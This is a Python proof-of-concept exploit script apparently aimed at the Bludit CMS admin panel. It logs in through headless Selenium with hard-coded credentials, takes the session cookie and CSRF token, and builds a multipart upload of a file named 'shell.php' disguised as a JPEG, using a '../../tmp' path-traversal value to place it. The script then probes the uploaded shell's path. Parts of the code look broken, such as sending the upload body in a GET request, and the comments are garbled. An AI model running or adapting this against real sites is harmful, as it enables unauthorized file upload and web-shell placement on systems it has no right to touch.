# -*- coding: utf-8 -*-
import sys
from selenium import webdriver
import requests
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait  # available since 2.4.0
from selenium.webdriver.support import expected_conditions as EC


def login(host):
    firefox_opt = webdriver.FirefoxOptions()
    firefox_opt.add_argument("--headless")
    #firefox_binary = FirefoxBinary('/usr/local/bin/geckodriver')
    
    #driver = webdriver.Firefox(firefox_binary=firefox_binary)
    driver = webdriver.Firefox(firefox_options=firefox_opt)
    url = host + '/admin'
    driver.get(url)
    cookie = driver.get_cookies()
    cookie_h = cookie[0]['name']
    cookie_b = cookie[0]['value']   
    driver.find_element_by_id("jsusername").clear()
    driver.find_element_by_id("jsusername").send_keys("cuc")
    driver.find_element_by_id("jspassword").clear()
    driver.find_element_by_id("jspassword").send_keys("111111")
    driver.find_element_by_xpath(
        '//div[@class="form-group mt-4"]/button[@class="btn btn-primary btn-lg mr-2 w-100"]').click()  # �����¼��ť
    driver.find_element_by_xpath('/html/body/div[3]/div/div[1]/ul/li[4]/a').click()  # ���׫д����
    csrftoken = driver.find_element_by_xpath('//*[@id="jstokenCSRF"]')
    ctoken = csrftoken.get_attribute('value')
    user_agent = driver.execute_script("return navigator.userAgent;")
    return ctoken, cookie_b,user_agent

def exp(host, token, cookie_b,user_agent):
    cookies = {
        'BLUDIT-KEY': cookie_b
    }
    headers = {
        'User-Agent':user_agent ,
        'Content-Type': 'multipart/form-data; boundary=--------327107347321150223463725464476',
        'Origin': host,
        'Referer': host + '/admin/new-content',
    }
    data = '----------327107347321150223463725464476\n' \
           + 'Content-Disposition: form-data; name="images[]"; filename="shell.php"\n' \
           + 'Content-Type: image/jpeg\n' \
           + '\n' \
           + 'hello \n' \
           + '----------327107347321150223463725464476\n' \
           + 'Content-Disposition: form-data; name="uuid"\n' \
           + '\n' \
           + '../../tmp' \
           + '\n' \
           + '----------327107347321150223463725464476\n' \
           + 'Content-Disposition: form-data; name="tokenCSRF"\n' \
           + '\n' \
           + '{csrftokrn}\n'.format(csrftokrn=token) \
           + '----------327107347321150223463725464476--\n'

    response = requests.get(host + '/bl-content/tmp/shell.php', headers=headers, data=data, cookies=cookies)
    if "hello" in response.text:
        print("Poc Success!")
    else:
        print("Poc failed!")    
    


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: exp.py blog_host')
        exit(0)
    h = sys.argv[1]
    tup = login(h)
    token = tup[0]
    cookie_b = tup[1]
    user_agent = tup[2]
    exp(h, token, cookie_b,user_agent)
